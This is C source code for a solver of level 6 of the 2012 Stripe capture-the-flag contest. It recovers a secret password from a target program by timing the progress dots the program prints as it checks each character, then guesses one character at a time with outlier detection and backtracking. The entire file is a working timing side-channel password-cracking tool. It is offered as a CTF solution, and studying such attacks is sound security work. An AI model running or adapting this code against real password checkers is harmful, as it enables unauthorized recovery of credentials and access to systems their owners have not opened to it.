/* stripesolver - A solver for level 6 of the Stripe CTF based on timing
 * Copyright (C) 2012 Thomas Hebb
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

#include <stdio.h>
#include <stdlib.h>
#include <sys/time.h>
#include <unistd.h>
#include <string.h>
#include <signal.h>
#include <errno.h>

#define MAX_PASSES 5
#define MAX_LENGTH 100

/* usecdifference - Find a sub-second difference between microsecond values.
 * Parameters:
 *   start: Start time in microseconds.
 *   end: End time in mocroseconds.
 * Return value: Difference between start and end in microseconds.
 */
inline long usecdifference (long start, long end) {
	long result = end - start;
	if (end < start) {
		// Everything we time will take less than a second
		result += 1000000;
	}
	return result;
}

/* findlargest - Find the largest value in an array of unsigned chars.
 * Parameters:
 *   counts: Unsigned char array.
 *   length: Number of elements in array.
 * Return value: Either the index of the largest value, or -1 in case of a tie.
 */
int findlargest (unsigned char *counts, int length) {
	int i, highind, highval = 0, tied = 1;
	for (i = 0; i < length; ++i) {
		if (counts[i] > highval) {
			highval = counts[i];
			highind = i;
			tied = 0;
		} else if (counts[i] == highval) {
			tied = 1;
		}
	}

	return tied ? -1 : highind;
}

/* qs_partition - Partitioning algorithm for quicksort - do not call directly.
 * Parameters:
 *   array: Array containing values to partition.
 *   start: First index of area to partition.
 *   end: Last index of area to partition.
 * Return value: Index of the center of the partition.
 */
int qs_partition (long *array, int start, int end) {
	int pivot = array[(start + end) / 2];
	int i = start - 1, j = end + 1;

	while (1) {
		do {
			++i;
		} while (array[i] < pivot);
		do {
			--j;
		} while (array[j] > pivot);
		if (i < j) {
			long temp = array[i];
			array[i] = array[j];
			array[j] = temp;
		} else {
			return j;
		}
	}
}

/* qs_helper - Recursive algorithm for quicksort - do not call directly.
 * Parameters:
 *   array: Array containing values to sort.
 *   start: First index of area to sort.
 *   end: Last index of area to sort.
 */
void qs_helper (long *array, int start, int end) {
	int split = qs_partition(array, start, end);

	if (start < split) {
		qs_helper(array, start, split);
	}
	if (end > split + 1) {
		qs_helper(array, split + 1, end);
	}
}

/* quicksort - Quicksort algorithm.
 * Parameters:
 *   array: Array to sort.
 *   length: Number of elements in array.
 */
void quicksort (long *array, int length) {
	qs_helper(array, 0, length - 1);
}

/* startguesser - Starts the target application with the given string.
 * Parameters:
 *   fd: Array of file descriptors that will be filled with the pipes to stdin,
 *       stdout, and stderr, respectively.
 *   path: Path of target application.
 *   file: File to target.
 *   str: String to guess.
 * Return value: PID of child process.
 */
pid_t startguesser (int fd[3], char *path, char *file, char *str) {
	int infd[2], outfd[2], errfd[2];
	pid_t child;
	// Create pipes
	if (pipe(infd) == -1 || pipe(outfd) == -1 || pipe(errfd) == -1) {
		perror("Error creating pipes");
		exit(EXIT_FAILURE);
	}

	if (!(child = fork())) {
		// Child
		dup2(infd[0], 0);
		  close(infd[0]);
		  close(infd[1]);
		dup2(outfd[1], 1);
		  close(outfd[0]);
		  close(outfd[1]);
		dup2(errfd[1], 2);
		  close(errfd[0]);
		  close(errfd[1]);
		if (execl(path, path, file, str, NULL) == -1) {
			perror("Error executing guesser");
			exit(EXIT_FAILURE);
		}
		exit(EXIT_SUCCESS);
	}

	// Parent
	if (child == -1) {
		perror("Error forking");
		exit(EXIT_FAILURE);
	}

	// Set pipe array and return
	fd[0] = infd[1];
	  close(infd[0]);
	fd[1] = outfd[0];
	  close(outfd[1]);
	fd[2] = errfd[0];
	  close(errfd[1]);
	return child;
}

/* teststring - Tests the given string - assumes that all characters except
 *              the last two are correct.
 * Parameters:
 *   path: Path of target application.
 *   file: File to target.
 *   str: String to guess.
 *   wrongind: Pointer to contain the index of the first wrong character.
 * Return value: Time taken for the second-to-last character to be checked or
 *               -1 if the string is too short.
 */
long teststring (char *path, char *file, char *str, int *wrongind) {
	int numchars = strlen(str);
	if (numchars <= 1) {
		return -1;
	}

	int fd[3], i, highval = 0, delta;
	struct timeval temp;
	long times[numchars - 1];
	FILE *errfile;
	char current;

	// Start the guesser and open the stderr fd
	startguesser(fd, path, file, str);
	close(fd[0]);
	close(fd[1]);
	errfile = fdopen(fd[2], "r");
	setvbuf(errfile, NULL, _IONBF, 0);

	// Time each '.' output
	i = 0;
	while ((current = fgetc(errfile)) != EOF) {
		if (current == '.') {
			gettimeofday(&temp, 0);
			times[i] = temp.tv_usec;
			++i;
		}
	}

	for (i = 1; i < numchars; ++i) {
		delta = usecdifference(times[i-1], times[i]);
		if (delta > highval) {
			highval = delta;
			*wrongind = i - 1;
		}
	}
	fclose(errfile);
	return delta;
}

/* checkstring - Checks the given string. Is deterministic, unlike teststring.
 * Parameters:
 *   path: Path of target application.
 *   file: File to target.
 *   str: String to check.
 * Return value: 0 if the string is not correct, 1 if it is.
 */
unsigned char checkstring (char *path, char *file, char *str) {
	int fd[3];
	FILE *errfile;
	char current;

	// Start the guesser and open the stderr fd
	startguesser(fd, path, file, str);
	close(fd[0]);
	close(fd[1]);
	errfile = fdopen(fd[2], "r");

	unsigned char linecount = 0;
	while ((current = fgetc(errfile)) != EOF) {
		if (current == '\n' && ++linecount == 2) {
			current = fgetc(errfile);
			fclose(errfile);
			return current != EOF;
		}
	}
	fclose(errfile);
	return 0;
}

/* variance - calculates the variance of an array of values.
 * Parameters:
 *   data: Array to calculate the variance of.
 *   variation: Array to store the cumulative variances in.
 *   length: Number of elements in arrays.
 * Return value: The calculated variance
 */
float variance (long *data, float *variation, int length) {
	if (length == 0) {
		return 0;
	}
	int i, n = 0;
	float delta, mean = 0, M2 = 0;
	for (i = 0; i < length; ++i) {
		++n;
		delta = data[i] - mean;
		mean += delta / n;
		if (n > 1) {
			M2 += delta * (data[i] - mean);
		}
		variation[i] = M2 / n;
	}
	return M2 / n;
}

/* markoutliers - Attempts to find and mark the lowest times in the in array.
 * Parameters:
 *   in: Array of length length containing time measurements.
 *   out: Array of length length which will get "correct" elements incremented.
 *   length: Number of elements in arrays.
 */
void markoutliers (long *in, unsigned char *out, int length) {
	long sorted[length];
	memcpy(sorted, in, length * sizeof(long));
	quicksort(sorted, length);

	int i = 1, threshhold;
	float dold, dnew;
	float variation[length];
	variance(sorted, variation, length);

	dnew = variation[1] - variation[0];
	do {
		++i;
		dold = dnew;
		dnew = variation[i] - variation[i - 1];
	} while (dnew >= dold);
	threshhold = sorted[i - 1];

	/*printf("    {");
	for (i = 0; i < length - 1; ++i) {
		printf("%i, ", sorted[i]);
	}
	printf("%i} = %i\n", sorted[i], threshhold);*/

	for (i = 0; i < length; ++i) {
		if (in[i] >= threshhold) {
			out[i] = 0;
		}
	}
}

/* guesschar - Guesses the next character in string known.
 * Parameters:
 *   path: Path of target application.
 *   file: File to target.
 *   known: Current known string. The guessed character will be appended.
 *   charlist: List of characters to try.
 * Return value: Guessed character, 0 if an error occured, -1 if the passed
 *               string is incorrect.
 */
char guesschar (char *path, char *file, char *known, char *charlist) {
	int numchars = strlen(charlist);
	int index = strlen(known);
	long times[numchars];
	unsigned char counts[numchars];

	known[index + 1] = '!';
	known[index + 2] = '\0';

	// printf("Guessing character %i\n", index + 1);
	// printf("  Zeroing counts\n");
	int i, j = 0;
	for (i = 0; i < numchars; ++i) {
		counts[i] = 1;
	}

	// printf("  Running passes\n");
	int highind, wrongind, incorrect;
	while ((highind = findlargest(counts, numchars)) == -1 && j <= MAX_PASSES) {
		// printf("    Pass %i\n", j + 1);
		incorrect = 1;
		for (i = 0; i < numchars; ++i) {
			if (counts[i]) {
				known[index] = charlist[i];
				times[i] = teststring(path, file, known, &wrongind);
				if (wrongind == index) {
					incorrect = 0;
				}
			}
		}
		markoutliers(times, counts, numchars);
		if (incorrect) {
			// printf("  Backtracking...\n");
			known[index - 1] = '\0';
			return -1;
		}
		++j;
	}
	// printf("Guessed character %i as %c after %i %s\n", index + 1, charlist[highind], j, j == 1 ? "pass" : "passes");

	if (highind == -1) {
		known[index] = '\0';
		return 0;
	} else {
		known[index + 1] = '\0';
		known[index] = charlist[highind];
		return charlist[highind];
	}
}

/* findstring - Finds an entire string.
 * Parameters:
 *   path: Path of target application.
 *   file: File to target.
 *   charlist: List of characters to try.
 * Return value: Guessed string or 0 if an error occured.
 */
char *findstring (char *path, char *file, char *charlist) {
	char *str = (char*)malloc(MAX_LENGTH);
	char current;
	str[0] = '\0';
	int i = 0;
	while ((current = guesschar(path, file, str, charlist)) != 0 && i < MAX_LENGTH - 2) {
		if (checkstring(path, file, str)) {
			return str;
		}
		if (current == -1) {
			--i;
		} else {
			++i;
		}
	}
	return 0;
}

/* main - Main function.
 * Parameters: Seriously?
 * Return value: You should know this.
 */
int main (int argc, char **argv) {
	char *charlist = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
	FILE *fd;

	if (argc != 3) {
		fprintf(stderr, "Usage: %s path file\n", argv[0]);
		exit(EXIT_FAILURE);
	}

	if (!(fd = fopen(argv[2], "r"))) {
		perror("Warning: Could not open file");
	} else {
		fclose(fd);
	}

	signal(SIGCHLD, SIG_IGN);
	char *str = findstring(argv[1], argv[2], charlist);
	printf("%s\n", str == 0 ? "Sorry, the password could not be found" : str);
	free(str);

	return EXIT_SUCCESS;
}

